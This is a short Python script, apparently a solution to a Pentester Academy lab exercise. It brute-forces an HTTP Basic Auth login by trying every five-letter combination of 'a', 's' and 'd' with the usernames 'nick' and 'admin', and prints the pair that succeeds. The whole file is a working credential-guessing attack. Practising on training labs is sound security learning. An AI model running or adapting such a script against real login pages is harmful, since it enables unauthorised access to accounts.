import requests
from requests.auth import HTTPBasicAuth
from itertools import product
lst =[]
for roll in product(['a','s','d'], repeat = 5):
   str1 = ''.join(roll)
   lst.append(str1)
user=["nick", "admin"] 

for username in user:
    for password in lst:
        auth=HTTPBasicAuth(username,password)
        r=requests.post(url="https://pentesteracademylab.appspot.com/lab/webapp/basicauth",auth=auth)
        if r.status_code==200:
            print username+" "+password
        if r.status_code==401:
            print "trying"
